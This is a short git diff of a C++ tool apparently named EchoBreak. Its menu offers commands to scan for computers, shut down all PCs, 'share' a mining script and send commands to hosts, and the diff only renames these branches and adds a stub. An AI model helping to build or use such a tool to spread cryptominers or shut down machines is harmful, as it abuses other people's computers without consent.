@@ -104,8 +104,9 @@ int main(int argc, char* argv[]){
 	if(argc <= 1){
 		std::cout << "Enter: scan, setup, connect\n";
 		std::cout << "	scan - scanns for computers\n";
-		std::cout << "	setup - shares a setup script (DANGEROUS)\n";
+		std::cout << "	setup - setup EchoBreak\n";
 		std::cout << "  shutdown - shutdown all pc (DANGEROUS)\n";
+		std::cout << "  share - share minig script (DANGEROUS)\n";
 		std::cout << "	send [host] [cmd] - send cmd to host\n";
 		return 1;
 	}
@@ -139,7 +140,7 @@ int main(int argc, char* argv[]){
 		std::cout << "total hosts: " << total << std::endl;
 	}	
 
-	else if(arg == "setup"){
+	else if(arg == "share"){
 
 		std::string host;
 
@@ -166,6 +167,9 @@ int main(int argc, char* argv[]){
 		
 			}
 		}
+	}
+	else if(arg == "setup"){
+		std::cout << "later...\n";
 	}
 
 	else if(arg == "shutdown"){
